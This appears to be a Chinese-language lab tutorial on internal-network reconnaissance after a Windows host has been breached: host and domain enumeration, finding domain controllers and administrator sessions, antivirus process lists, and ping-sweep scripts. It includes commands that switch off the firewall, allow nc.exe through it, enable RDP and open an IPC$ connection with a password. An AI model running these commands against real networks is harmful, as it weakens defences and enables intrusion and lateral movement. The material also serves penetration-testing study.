## 一、前言

在上篇文章中，我们已经成功搭建好了一个内网的环境，在进入内网后，我们面对的是一片"黑暗森林"，所以我们需要对当前所处的网络环境进行判断通常的判断分为以下三种：

  * 我是谁？——对机器角色的判断。

  * 这是哪？——对目前机器所处网络环境的拓扑结构进行分析和判断。

  * 我在哪？——对目前机器所处位置区域的判断。

不管是在外网中还是在内网中，信息收集都是重要的第一步。对于内网中的一台机器，其所处内网的结构是什么样的、其角色是什么、使用这台机器的人的角色是什么，以及这台机器上安装了什么杀软、这台机器是通过什么方式上网的、这台机器是笔记本还是台式机还是虚拟机等问题，都需要通过信息收集来解答，渗透测试的本质就是信息收集！

## 二、判断当前环境

### 2.1 查看当前网卡和IP信息

    
    
    ipconfig /all
    

![image.png](https://image.3001.net/images/20220103/1641153389_61d2036d9a8e327928704.png!small)

由上图可见，当前机器有一张内网的网卡，并且 主 **DNS** 后缀 是⼀个域名，一般来说只有域机器才会有域名显示，在工作组下显示的是空：

![image.png](https://image.3001.net/images/20220103/1641153395_61d2037338cf0550b773f.png!small)

可以看到通过查看网卡信息可以判断出当前机器是否在域内，以及是否是⼀台域机器。

### 2.2 查看操作系统详细信息

    
    
    systeminfo
    

![image.png](https://image.3001.net/images/20220103/1641153401_61d20379e898818ba1e7e.png!small)

通过查看系统的详细信息我们可以判断出当前主机是一台属于域内的机器，因为在工作组环境的机器只会显示WORKGROUP：

![image.png](https://image.3001.net/images/20220103/1641153408_61d20380627477f5a9388.png!small)

可以看到通过查看系统详细信息也可以判断出当前机器是否在域内，以及是否是⼀台域机器。

### 2.3 查看当前登录域及域用户

    
    
    net config workstation
    

![image.png](https://image.3001.net/images/20220103/1641153414_61d20386f086d3ebda612.png!small)

可以发现域机器在工作站域会显示出当前的域的名称，而在工作组环境的机器只会显示WORKGROUP:

![image.png](https://image.3001.net/images/20220103/1641153421_61d2038d042adc3b525aa.png!small)

通过查看当前登录域及域用户也能知道当前机器是否在域内，是否是⼀台域机器还是工作组机器。

### 2.4 查看域内时间

    
    
    net time /domain
    

通过执行以上命令后有三种情况：

  * 存在域，当前用户不是域用户：

![image.png](https://image.3001.net/images/20220103/1641153427_61d2039369e1783f82e0b.png!small)

  * 存在域、当前用户是域用户：

![image.png](https://image.3001.net/images/20220103/1641153434_61d2039a04508e514ee0c.png!small)

  * 当前是工作组环境

![image.png](https://image.3001.net/images/20220103/1641153440_61d203a0bd72eddd36056.png!small)

通过查看域内时间也能知道当前机器是否在域内，是否是一台域机器还是工作组机器。

## 三、本机信息收集

当我们判断出当前是域还是工作组后，我们就可以对当前机器进行信息搜集了。

### 3.1 手动信息收集

#### 3.1.1 获取网卡配置信息

    
    
    ipconfig /all
    

![image.png](https://image.3001.net/images/20220103/1641153452_61d203ac001bbe931f2cf.png!small)

通过查看网卡配置信息，可以判断出当前主机有两个网卡，可以初步判断是一台边界服务器。我们也就可以扩大范围进行内网横向渗透，这就代表我们可以有机会获取更多主机的权限。

#### 3.1.2 查询操作系统和版本信息

    
    
    systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"			 ——英文系统
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"	    ——中文系统
    

![image.png](https://image.3001.net/images/20220103/1641153457_61d203b188aebc554475d.png!small)

为什么要获取操作系统和版本信息呢？因为当我们知道当前系统的版本后，如果当前获取的主机权限是一个低权限的用户，而我们想要提升为system权限，就可以针对性的搜集一些符合当前版本的exp。当我们在获取到system权限以后，也可以根据当前操作系统的版本选择不同的方式提取hash或是明文密码。

#### 3.1.3 查看安装的软件及版本、路径

    
    
    wmic product get name,version
    

![image.png](https://image.3001.net/images/20220103/1641153467_61d203bbe3acc5f727f71.png!small)

也可以通过执行powershell命令来获取安装软件的版本以及路径。

    
    
    powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name,version"
    

![image.png](https://image.3001.net/images/20220103/1641153472_61d203c0cd4f4bc28c425.png!small)

通过搜集当前本机安装了哪些版本的软件后，我们就知道当前机器的使用情况，比如某个软件存在一些溢出、提权漏洞、或者我们也可以利用⼀些软件进行 **DLL**
劫持提权。

#### 3.1.4 查询本机服务信息

    
    
    wmic service list brief
    

![image.png](https://image.3001.net/images/20220103/1641153485_61d203cd973b771c85974.png!small)

通过搜集当前本机的服务信息，我们就可以知道当前机器上是开启或是关闭了哪些服务。

#### 3.1.5 查询进程列表

1、查看当前进程列表和软件进程

    
    
    tasklist
    

![image.png](https://image.3001.net/images/20220103/1641153491_61d203d3f0eef1e7b2257.png!small)

也可以通过wmic命令进行查询；

    
    
    wmic process list brief
    

![image.png](https://image.3001.net/images/20220103/1641153498_61d203daaf1cfa559f8bb.png!small)

2、查看当前进程列表对应的用户身份

    
    
    tasklist /v
    

![image.png](https://image.3001.net/images/20220103/1641153506_61d203e200c123fc355a3.png!small)

通过执行这条命令我们可以知道每个进程是由哪个用户所启动的，但是这条命令只能查看相同级别或者比当前权限更低的用户的进程，如果当前机器内存在域管进程，就可以通过令牌窃取直接获取域管权限，域管进程如下：

![image.png](https://image.3001.net/images/20220103/1641153512_61d203e86659674bbd78b.png!small)

3、查看当前进程是否有杀毒软件（AV）

    
    
    tasklist /svc
    

![image.png](https://image.3001.net/images/20220103/1641153519_61d203efce6a497c67f16.png!small)

通过执行完这条命令后，我们就可以知道当前有哪些软件，以及对应的 PID 号、服务名，还可以将返回结果在杀软在线查询工具上进行查询，判断是否有杀毒软件。

下载地址：https://github.com/r00tSe7en/get_AV

因为在靶场环境中没有安装杀软，因此以物理机执行命令的返回结果进行演示：

![image.png](https://image.3001.net/images/20220103/1641153528_61d203f89b51f86236491.png!small)

常见杀毒软件的进程，如下表：

进程| 软件名称  
---|---  
360sd.exe| 360杀毒  
360tray.exe| 360实时保护  
ZhuDongFangYu.exe| 360主动防御  
KSafeTray.exe| 金山卫士  
SafeDogUpdateCenter.exe| 服务器安全狗  
McAfee McShield.exe| McAfee  
egui.exe| NOD32  
AVP.EXE| 卡巴斯基  
avguard.exe| 小红伞  
bdagent.exe| BitDefender  
  
#### 3.1.6 查看启动程序信息

    
    
    wmic startup get command,caption
    

![image.png](https://image.3001.net/images/20220103/1641153534_61d203feb3ffbcf891df8.png!small)

通过查看启动程序信息我们可以知道当前机器开机的时候会运行哪些软件，可以利用自启动进行劫持。

#### 3.1.7 查看计划任务

    
    
    schtasks /query /fo LIST /v
    

![image.png](https://image.3001.net/images/20220103/1641153539_61d204034d104d31a7df0.png!small)

在windwos 2008 服务器执行·························该命令会报错：无法加载列资源

![image.png](https://image.3001.net/images/20220103/1641153543_61d20407ed3ef8d798a30.png!small)

可以直接使用at查看当前的计划任务

![image.png](https://image.3001.net/images/20220103/1641153570_61d20422ba74fb4b89d6e.png!small)

通过查看本机计划任务我们就可以知道当前机器上会在什么时间运行哪些软件或是执行什么命令，我们就可以利用这⼀点来进行计划任务劫持。

#### 3.1.8 查看主机开机时间

    
    
    net statistics workstation
    

![image.png](https://image.3001.net/images/20220103/1641153580_61d2042ced55aad904735.png!small)

通过查看本机的开机时间，我们就能判断这台机器的管理员是不是经常关机，是不是经常登陆这台机器。

#### 3.1.9 查询用户列表

查看本机用户列表：

    
    
    net user
    

![image.png](https://image.3001.net/images/20220103/1641153611_61d2044b50dcb922b39b6.png!small)

通过分析本机用户列表，可以找出内网机器的命名规则。特别是个人机器的名称，可以用来推测整个域的用户命名方式。

查看本机管理员 (通常含有域用户)

    
    
    net localgroup administrators
    

![image.png](https://image.3001.net/images/20220103/1641153635_61d2046374da933829424.png!small)

默认Domain
Admins组中为域内机器的本地管理员用户，通过查看本机用户和本机管理员用户，就可以判断当前机器有没有其他管理员，或是有没有一些恶意账户，在真实的环境中，为了方便管理，会有域用户被添加到域机器的本地管理员用户，如下图：

![image.png](https://image.3001.net/images/20220103/1641153648_61d20470b6fe77ad20ab6.png!small)

查看当前在线用户

    
    
    query user || qwinsta
    

![image.png](https://image.3001.net/images/20220103/1641153656_61d20478c595a1d5076f2.png!small)

通过查看当前在线用户我们就可以知道当前机器有没有管理员在登陆，因为有的时候目标机器上可以存在一些杀软影响我们后续的一些操作，因此我们可能需要远程登录到目标服务器上，如果盲目登录，就有可能存在暴露的风险。

#### 3.1.10 查询会话情况

    
    
    net session
    

![image.png](https://image.3001.net/images/20220103/1641153681_61d2049198f82e51b6953.png!small)

如果没有建立连接，可以通过以下命令建立一个ipc连接：

例如：这里我想和10.10.10.13 机器下的 administrator 用户建立一个连接

    
    
    net use \\10.10.10.13\ipc$ "Admin12345" /user:C1ay\administrator
    

![image.png](https://image.3001.net/images/20220103/1641153696_61d204a0bec11eb8cb76b.png!small)

#### 3.1.11 查看本机端口开放情况

    
    
    netstat -ano
    

![image.png](https://image.3001.net/images/20220103/1641153712_61d204b061d8c98978bcd.png!small)

通过查看本机端口开放情况，我们就可以重点关注状态为ESTABLISHED端口连接的IP地址判断知道当前机器有没有与其他机器进行连接，也可以看到当前机器有没有开放远程桌面3389端口或是MySQL服务
3306 端口或是135、139、445等高危端口，为后续的渗透提供更多的方式。

#### 3.1.12 查询补丁信息

    
    
    systeminfo
    

![image.png](https://image.3001.net/images/20220103/1641153718_61d204b69ff74a082318a.png!small)

    
    
    wmic qfe get Caption,Description,HotFixID,InstalledOn
    

![image.png](https://image.3001.net/images/20220103/1641153725_61d204bd86a44f2db337a.png!small)

需要注意系统的版本、位数、域、补丁情况及更新频率。域内主机的补丁通常是批量安装的，通过查看本机补丁列表，就可以找到未打补丁的漏洞进行利用。

#### 3.1.13 查询路由表及ARP缓存表

    
    
    route print
    

![image.png](https://image.3001.net/images/20220103/1641153735_61d204c7364eb7581a6ba.png!small)

    
    
    arp -a
    

![image.png](https://image.3001.net/images/20220103/1641153747_61d204d3e7725a9437fbd.png!small)

通过查询路由表及ARP缓存表，我们就可以知道当前网络的分布情况以及内网内还有没有其他机器。

#### 3.1.14 查询本机共享

    
    
    net share 
    wmic share get name,path,status
    

![image.png](https://image.3001.net/images/20220103/1641153758_61d204de85481b6de728f.png!small)

通过查看本机共享我们就可以知道本机里哪些资源可以被外部主机进行访问，在后续IPC连接中会使用到。

#### 3.1.15 查询当前权限

    
    
    whoami
    

结果可能为：本地普通用户、本地管理员用户、域内用户。

  * 本地普通用户：当前win-2008本机的user用户，如下图。  
![image.png](https://image.3001.net/images/20220103/1641153764_61d204e4d4ca4521e2db2.png!small)

  * 本地管理员用户：当前位win7-x64-test本机的administrator用户，如下图。  
![image.png](https://image.3001.net/images/20220103/1641153771_61d204ebde0cdf1ac5cb3.png!small)

  * 域内用户：当前为c1ay域内的zhangsan用户，如下图。

![image.png](https://image.3001.net/images/20220103/1641153777_61d204f126f0b4e0018c6.png!small)

在这三种情况中，如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域内信息。其原理是域内的所有查询都是通过域控制器实现的(基于LDAP协议)，而这个查询需要经过权限认证，所以，只有域用户才拥有这个权限;当域用户执行查询命令时，会自动使用Kerberos
协议进行认证，无须额外输入账号和密码。  
本地管理员 Administrator
权限可以直接提升为Ntauthority或System权限，因此，在域中，除普通用户外，所有的机器都有一个机器用户（用户名是机器名加上“$”)。在本质上，机器的system用户对应的就是域里面的机器用户。所以，使用System权限可以运行域内的查询命令。

#### 3.1.16 查看防火墙配置

    
    
    netsh firewall show config
    

![image.png](https://image.3001.net/images/20220103/1641153788_61d204fc5ec1187fe395d.png!small)

通过查看防火墙配置我们就能知道当前机器是否开了防火墙以及防火墙的一些配置信息。。。

修改防火墙配置信息：

    
    
    win 2003及之前的版本，运⾏指定程序全部连接：
    netsh firewall add allowedprogram c:\nc.exe "allow nc" enable
    
    win 2003之后的版本用这条：
    netsh advfirewall firewall add rule name="pass nc" dir=in action=allow
    program="C:\nc.exe"
    
    允许指定程序连出，命令如下
    netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C:
    \nc.exe"
    
    允许 3389 端口放⾏，命令如下
    netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in
    localport=3389 action=allow
    
    自定义防⽕墙日志储存位置
    netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"
    

关闭防火墙：

    
    
    win 2003及之前的版本⽤这条命令：
    netsh firewall set opmode disable
    win 2003之后的版本⽤这条命令：
    netsh advfirewall set allprofiles state off
    

查询并开启远程连接服务：

查看远程连接端口

    
    
    Reg query "hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp” /v portnumber
    

![image.png](https://image.3001.net/images/20220103/1641153801_61d20509b6a895a4af681.png!small)

开启远程连接服务

    
    
    # 在 Windows Server 2003 中开启 3389 端⼝
    wmic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections
    1
    
    # 在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端⼝
    wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where
    (__CLASS !="") call setallowtsconnections 1
    
    wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where
    (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1
    
    # 在 Windows 7 中开启 3389 端⼝
    reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v
    fSingleSessionPerUser /t REG_DWORD /d 0 /f
    

#### 3.1.17 查看代理配置情况

    
    
    reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings
    

![image.png](https://image.3001.net/images/20220103/1641153807_61d2050faef277aa2d2a7.png!small)

### 3.2 自动信息收集

为了简化操作，可以创建一个脚本，在目标机器上完成流程、服务、用户账号、用户组、网络接口、硬盘信息、网络共享信息、操作系统、安装的补丁、安装的软件、启动时运行的程序、时区等信息的查询工作。网上有很多类似的脚本，当然，我们也可以自己定制一个。在这里，笔者推荐一个利用WMIC
收集目标机器信息的脚本。  
WMIiC ( Windows Management Instrumentation Command-Line，Windows管理工具命令行)是最有用的Windows命令行工具。在默认情况下，任何版本的Windows
XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC 并执行相关查询操作。

WMIC下载地址：http://www.fuzzysecurity.com/scripts/files/wmic_info.rar

![image.png](https://image.3001.net/images/20220103/1641153822_61d2051e08ebc386f061c.png!small)

### 3.3 Empire下的主机信息收集

Empire提供了用于收集主机信息的模块。输入命令“usemodule
situational_awareness/host/winenum”，即可查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等，如图：

![image.png](https://image.3001.net/images/20220103/1641153829_61d205254c0ad7fa82921.png!small)

另外,situational_awareness/host/computerdetails模块几乎包含了系统中所有有用的信息,例如目标主机事件日志、应用程序控制策略日志，包括RDP登录信息、PowerShell脚本运行和保存的信息等。运行这个模块需要管理员权限。

## 四、域内信息收集

### 4.1 域内基础信息收集

1、获取域SID

    
    
    whoami /all
    

![image.png](https://image.3001.net/images/20220103/1641153840_61d2053083d1eb89a4ddf.png!small)

域SID主要是用来区分不同域，域用户SID是用来区分域内不同的用户的，在后续票据传递中会使用到。

2、查询域内用户

    
    
    net user /domain
    

![image.png](https://image.3001.net/images/20220103/1641153876_61d205540658f794770aa.png!small)

通过查询域内用户就可以知道当前这个域内所有的用户名

3、查看域用户的详细信息

    
    
    net user tom /domain
    

![image.png](https://image.3001.net/images/20220103/1641153883_61d2055b1a01289977909.png!small)

通过查看域用户的详细信息可以得到域用户密码的到期时间，所属组以及上次登录的时间等信息

4、查询域列表（假如存在多个域）

    
    
    net view /domain
    

![image.png](https://image.3001.net/images/20220103/1641153890_61d20562376fcbfa969d6.png!small)

通过查询域列表可以看到，当前存在两个域分别是：C1AY，SUB

5、查看域内主机信息

    
    
    net view
    

![image.png](https://image.3001.net/images/20220103/1641153896_61d2056899594e414cb3f.png!small)

通过查询域内主机信息可以看到，当前域内存在着3台计算机。

6、获取所在指定域下的主机名

    
    
    net view /domain:C1ay
    

![image.png](https://image.3001.net/images/20220103/1641153902_61d2056e29ef6d3d728dc.png!small)

通过查询指定域下的主机名也可以看到，当前域内存在着3台主机。

7、查看域内计算机

    
    
    net group "domain computers" /domain
    

![image.png](https://image.3001.net/images/20220103/1641153908_61d20574a0f74eedcf982.png!small)

通过查看域内计算机可以看到，一共有2台计算机加入了当前域。

8、查看域信任关系

    
    
    nltest /domain_trusts
    

![image.png](https://image.3001.net/images/20220103/1641153916_61d2057c5ff85e5c0b093.png!small)

通过查看域信任关系可以判断出当前域是否存在着林信任或是父子域信任，后续在跨域攻击或者是跨林攻击中会使用到。

9、查询域密码信息

    
    
    net accounts /domain
    

![image.png](https://image.3001.net/images/20220103/1641153923_61d2058318caf0a62a39d.png!small)

通过查询域密码信息我们就可以知道当前域用户多久修改⼀次密码，密码策略的是什么，就可以针对性的制定⼀份密码字典，提高效率。

10、查看域内时间（时间服务器）

    
    
    net time /domain
    

![image.png](https://image.3001.net/images/20220103/1641153929_61d205895057d4ce86425.png!small)

通过查看域内时间（时间服务器），我们得知了当前域的时间，我们就可以通过使用定时任务+IPC远程连接的方式来运行⼀些bat文件，后续会详细介绍，

11、查看域内用户组列表

    
    
    net group /domain
    

![image.png](https://image.3001.net/images/20220103/1641153935_61d2058f44f274ba9464a.png!small)

  * Domain Admins:域管理员。

  * Domain Computers: 域内机器。

  * Domain Controllers:域控制器。

  * Domain Guest: 域访客，权限较低。

  * Domain Users: 域用户。

  * Enterprise Admins: 企业系统管理员用户。  
在默认情况下，Domain Admins和Enterprise Admins对域内所有域控制器有完全控制权限。

通过查看域的用户组我们可以知道每个组具体是做什么的，比如说⼀些大型企业或者集团会有专门设有财务组、信息组、营销组...等等，那么假设我们要针对于某个部门、某个组、在具体到某个人来进行渗透，那么搜集组信息就尤为关键了。

12、查看存在的用户

    
    
    dsquery user
    

![image.png](https://image.3001.net/images/20220103/1641153942_61d20596cab58ec7f13b5.png!small)

常用的dsquery命令如下：

![image.png](https://image.3001.net/images/20220103/1641153947_61d2059b4d530519dd12f.png!small)

### 4.2 域内控制器的查找

1、通过nltest命令查找域控制器

    
    
    nltest /dclist:hacker
    

![image.png](https://image.3001.net/images/20220103/1641153965_61d205ad3ba6a8e585018.png!small)

可以看到当前域内存在着两台域控制器，一台为主控制器，一台为辅域控制器。

2、通过查询域内时间

    
    
    net time /domain
    

![image.png](https://image.3001.net/images/20220103/1641153972_61d205b4410b62ef5b25a.png!small)

因为时间服务器一般为域控制器，我们也可以通过ping命令来获取到域控制器的IP地址：

![image.png](https://image.3001.net/images/20220103/1641154024_61d205e8b7d8e0dc10c45.png!small)

3、查看域控制器组

    
    
    net group "Domain Controllers" /domain
    

![image.png](https://image.3001.net/images/20220103/1641154056_61d20608a4ae8d857212f.png!small)

4、查询主域控制器

    
    
    netdom query pdc
    

![image.png](https://image.3001.net/images/20220103/1641154041_61d205f910ca0f99e643d.png!small)

5、nslookup查询

    
    
    nslookup DC1.c1ay.lab
    

![image.png](https://image.3001.net/images/20220103/1641154064_61d2061066704e565f40d.png!small)

### 4.3 定位域管理员

#### 4.3.1 查看域管理员组

    
    
    net localgroup administrators /domain
    

![image.png](https://image.3001.net/images/20220103/1641154070_61d206169f567376bc1ed.png!small)

#### 4.3.2 psloggedon.exe

该工具可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如果指定的是用户名而不是计算机名，该工具会搜索网上邻居中的计算机，并显示该用户当前是否已经登录。其原理是通过检查注册表
HKEY_USERS 项的 key 值 和 通过 NetSessionEnum API 来枚举网络会话，但是该工具的某些功能需要管理员权限才能使用。

参数：

  * -l：仅显示本地登录，不显示本地和网络资源登录

  * -x：不显示登录时间

  * \计算机名：指定要列出登录信息的计算机的名称

  * 用户名：指定用户名，在网络中搜索该用户登录的计算机，该功能实现有问题

效果如下：

  1. 获取本地及远程登录的计算机名称

    
    
    PsLoggedon.exe -l
    

![image.png](https://image.3001.net/images/20220103/1641154080_61d206204b5d6b16c7a9c.png!small)

  2. 获取指定计算机名的用户

    
    
    PsLoggedon.exe \\DC1
    

![image.png](https://image.3001.net/images/20220103/1641154087_61d206277792d2adcef98.png!small)

  3. 获取指定用户登录的计算机

    
    
    PsLoggedon.exe administrator
    

![image.png](https://image.3001.net/images/20220103/1641154094_61d2062e9172b19d2a5e6.png!small)

#### 4.3.3 PVEFindADUser.exe

该工具可用于查找活动目录用户登录的位置，枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户、用于运行服务和计划任务的用户。该工具的运行不需要管理员权限，
只需要普通域用户即可。

参数：

  * -h：显示帮助信息

  * -u：检查程序是否有新版本

  * -current ：如果仅指定了-current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名，则显示该用户登录的计算机

  * -last：如果仅制定了-last参数，将获取目标计算机的最后一个登录用户。如果指定了用户名，则显 示此用户上次登录的计算机。根据网络的安全策略，可能会隐藏最后一个登录用户的用户名，此时 使用该工具可能无法得到该用户名。

  * -noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行ping命令 。

  * -target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机。 如果指定了此参数，则后跟一个由逗号分隔的主机名列表。

效果如下：

  1. 查询所有主机当前的登录用户

    
    
    pveadfinduser.exe -current
    

![image.png](https://image.3001.net/images/20220103/1641154103_61d2063733982ee253d82.png!small)

查询结果将 被输出到 report.csv文件中。

  2. 查询指定用户当前登录的主机

    
    
    PVEFindADUser.exe -current c1ay\administrator
    

![image.png](https://image.3001.net/images/20220103/1641154108_61d2063cdcb11bbd775de.png!small)

  3. 查询指定主机当前的登录用户

    
    
    PVEFindADUser.exe -current -target DC1
    

![image.png](https://image.3001.net/images/20220103/1641154118_61d2064621324bf80be35.png!small)

#### 4.3.4 PowerView

使用PowerView.ps1脚本的Invoke-StealthUserHunter和Invoke-UserHunter函数：

  * Invoke-UserHunter：找到域内特定的用户群，接收用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。它可以使用Get-NetSessions和Get-NetLoggedon扫描每台服务器并对扫描结果进行比较，从而找到目标用户集，不需要管理员权限。

  * Invoke-StealthUserHunter：只需要进行一次查询，就可以获取域内的所有用户。该函数从user.HomeDirectories 中提取所有用户，并对每台服务器进行Get-NetSessions获取。因为不需要使用Invoke-UserHunter对每台机器进行操作，所以这个方法的隐蔽性相对较高，但是扫描结果不一定全面。PowerView默认使用Invoke-StealthUserHunter，如果找不到需要的信息，就使用 Invoke-UserHunter。

执行以下命令可用于定位指定域用户登录的主机和查看指定主机当前的登录用户。但是值得说明的是，查看指定主机当前登录的用户这个功能并不好用，仅仅能列出当前主机登录的用户，枚举其他主机时不显示。

    
    
    set-executionpolicy remotesigned	设置执行权限，该命令需要以管理员权限执行
    Import-Module .\PowerView.ps1		导入powerview.ps1脚本
    powershell Invoke-UserHunter		运行脚本函数
    

![image.png](https://image.3001.net/images/20220103/1641154127_61d2064f2d5dd959196b4.png!small)

#### 4.3.5 通过NetSess工具

netsess.exe的原理也是调用NetSessionEnum API，并且无需管理员权限。

    
    
    netsess.exe -h 机器名
    

![image.png](https://image.3001.net/images/20220103/1641154133_61d20655a84bbafcadd88.png!small)

还有其他很多方式，这里就不一一列举了。

### 4.4 查找域管理进程

当计算机加入到域后，默认将"Domain
Admin"组赋予了本地系统管理员的权限。也就是说，在计算机添加到域，成为域的成员主机的过程中，系统将会自动把"Domain
Admin"域组添加到本地的Administrators组中。因此，只要是Domain Admin组的成员均可访问本地计算机，而且具备"完全控制"的权限。

因此对于渗透测试人员来说，把"Domain
Admin"域组添加到本地的Administrators组中是他们模拟域管理员帐户操作的常用方式。不过前提是，我们需要知道这些进程正在运行的系统。这里介绍五种寻找
"Domain Admin" 运行的进程的方法，其中涉及的技术包括：

  1. 本地检查；

  2. 查询活动域用户会话的域控制器；

  3. 扫描运行任务的远程系统；

  4. 扫描NETBIOS协议信息的远程系统；

  5. 用于令牌验证的PSExec Shell喷洒远程系统。

#### 4.4.1 本地检查

首先查看获取权限的这个系统，如果这个系统已经存在域管理进程，自然就不需要进行后续的几个操作了，具体步骤如下：

1、获取域管理员列表

    
    
    net group "Domain Admins" /domain
    

![image.png](https://image.3001.net/images/20220103/1641154140_61d2065ced294aacb11ab.png!small)

2、列出进程和进程用户

    
    
    tasklist /v
    

![image.png](https://image.3001.net/images/20220103/1641154146_61d2066202656fab7fc9f.png!small)

3、将进程列表对应的进程用户与域管理员列表进行对比，查看当前系统是否存在域管理进程

![image.png](https://image.3001.net/images/20220103/1641154150_61d206662ec7f5fe7a4de.png!small)

如果像上图这样域管理进程是在获取权限的系统上，这就太好了，当然在真实场景下遇到这种情况毕竟还是小数，因此我们还需要介绍其他几种方式来帮助大家在各种情况下的远程域系统上找到域管理进程。

#### 4.4.2 查询域控制器的域用户会话

查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理会话的系统列表。

1、查询域控制器列表

    
    
    net group "Domain Controllers" /domain
    

![image.png](https://image.3001.net/images/20220103/1641154157_61d2066d4e9d5964f6bd8.png!small)

2、收集域管理员列表

    
    
    net group "Domain Admins" /domain
    

![image.png](https://image.3001.net/images/20220103/1641154167_61d206778d403468b6172.png!small)

3、收集所有活动域的会话列表

使用Netsess.exe查询每个域控制器，收集所有活动域会话的列表。 Netsess工具是Joe
Richards提供的一个很棒的工具，它里面包含了本地Windows函数“netsession
enum”。该函数可以返回活动会话的IP地址、域帐户、会话启动时间和空闲时间，命令如下：

    
    
    NetSess.exe -h DC1
    

![image.png](https://image.3001.net/images/20220103/1641154175_61d2067fb5f0b1ac1931b.png!small)

4、交叉引用域管理员列表域活动会话列表

对域管理员列表和活动会话列表进行交叉引用，可以确定哪些IP地址有活动域令牌。也可以通过下列脚本快速使用netsess.exe的Windows命令行。将域控制器列表添加到dcs.txt
中，将域管理员列表添加到admins.txt 中，并与netsess.exe放在同一目录下。

    
    
    FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i && @netsess -h %i 2>nul > sessions.txt && FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a
    

![image.png](https://image.3001.net/images/20220103/1641154183_61d206873b738cdd2dbe8.png!small)

#### 4.4.3 查询远程系统中运行的任务

如果目标机器在域系统中是通过共享的本地管理员账号运行的，就可以使用下列脚本来查询系统中的域管理任务。

1、从 "Domain Admin" 组中收集域管理员，命令如下：

    
    
    net group "Domain Admins" /domain
    

2、运行如下脚本，将目标域内主机ip保存为ips.txt文件，域管理员保存为admins.txt文件。

    
    
    FOR /F %i in (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL > output.txt && FOR /F %n in (names.txt) DO @type output.txt | findstr %n > NUL && echo [!] %n was found running a process on %i && pause
    

#### 4.4.4 扫描远程系统的NetBIOS信息

某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户，下面这个命令就用于扫描远程系统中的管理会话。将目标域内主机ip保存为ips.txt文件,域管理员保存为admins.txt文件。

![image.png](https://image.3001.net/images/20220103/1641154191_61d2068f9f409a7aecf5e.png!small)

然后输入如下命令：

    
    
    for /F %i in (ips.txt) do @echo [+] Checking %i && nbtstat -A %i 2>NUL >res.txt && FOR /F %n in (admins.txt) DO @type res.txt | findstr /I %n > NUL && echo [!] %n w
    

![image.png](https://image.3001.net/images/20220103/1641154195_61d20693d44c38e7c0962.png!small)

也可以使用运行速度稍快的nbtscan工具，下面是另一个基本的脚本命令

    
    
    for /F %i in (ips.txt) do @echo[+] Checking %i && nbtscan -f %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
    

![image.png](https://image.3001.net/images/20220103/1641154201_61d206999adb6c406adcc.png!small)

### 4.5 域内存活主机探测

#### 4.5.1 利用netbios快速探测内网

工具：Nbtscan

使用方法：将该文件上传到目标机器上并执行 nbtscan.exe IP 即可

    
    
    nbtscan.exe  10.10.10.0/24
    

效果如下：

![image.png](https://image.3001.net/images/20220103/1641154207_61d2069f042ebb6a5908d.png!small)

各参数解释如下：

![image.png](https://image.3001.net/images/20220103/1641154212_61d206a40a5aef41c78d9.png!small)

#### 4.5.2 利用ICMP协议快速探测内网

依次对内网中的每个IP地址执行ping命令，可以快速找出内网中所有存活的主机，命令如下：

    
    
    for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr "TTL="
    

![image.png](https://image.3001.net/images/20220103/1641154218_61d206aa415705aebe5b0.png!small)

也可以使用bat脚本探测存活主机，代码如下：

    
    
    @echo off
    set /p ip="请输入IP地址段，格式如："192.168.1." >>> "
    for /L %%i in (1,1,255) do (
    Ping.exe -n 1 -l 16 -w 100 %ip%%%i |findstr TTL=  >nul && echo %ip%%%i is up. || echo %ip%%%i is down.
    )
    echo 检测ping完成！& pause
    

![image.png](https://image.3001.net/images/20220103/1641154228_61d206b44a415a2f65427.png!small)

还可以使用vbs脚本探测存活主机，代码如下：

    
    
    strSubNet = "10.10.10."
    Set objFSO= CreateObject("Scripting.FileSystemObject") 
    Set objTS = objfso.CreateTextFile("C:\Windows\Temp\Result.txt")
    For i = 1 To 254 
    strComputer = strSubNet & i 
    blnResult = Ping(strComputer) 
    If blnResult = True Then 
    objTS.WriteLine "Ping " & strComputer & " success!" 
    End If
     Next 
    objTS.Close 
    WScript.Echo "Done!" 
    Function Ping(strComputer) 
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2") 
    Set colItems = objWMIService.ExecQuery("Select * From Win32_PingStatus Where Address='" & strComputer & "'") 
    For Each objItem In colItems 
    Select case objItem.StatusCode 
    Case 0 
    Ping = True 
    Case Else 
    Ping = False 
    End select 
    Exit For 
    Next 
    End Function
    

运行结果如下：

![image.png](https://image.3001.net/images/20220103/1641154236_61d206bc075b0207f9a36.png!small)

